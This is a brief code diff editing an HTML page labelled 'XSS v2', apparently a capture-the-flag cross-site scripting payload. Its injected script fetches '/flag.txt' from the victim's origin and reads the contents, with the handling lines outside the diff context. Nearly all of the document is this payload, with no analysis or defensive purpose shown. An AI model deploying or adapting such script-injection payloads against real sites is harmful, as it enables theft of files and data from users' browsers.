@@ -1,3 +1,5 @@
+<body>
+  <p>XSS v2</p>
 <script>
 fetch('/flag.txt', {mode: 'no-cors'}).then(function(r) {
   r.text().then(function(f) {
@@ -6,3 +8,4 @@ fetch('/flag.txt', {mode: 'no-cors'}).then(function(r) {
   })
 })
 </script>
+</body>
